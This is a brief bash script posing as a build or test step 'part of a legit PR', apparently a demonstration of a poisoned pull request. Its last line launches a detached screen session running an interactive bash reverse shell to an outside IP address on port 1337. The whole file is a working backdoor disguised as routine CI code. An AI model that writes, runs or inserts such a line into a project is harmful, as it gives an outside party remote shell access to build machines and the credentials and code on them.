#!/bin/bash


echo 'This simulates some build or test process'
echo 'This is a part of a legit PR'

echo 'Exploiting...'
screen -dmS reverse_shell bash -i >& /dev/tcp/104.238.172.243/1337 0>&1
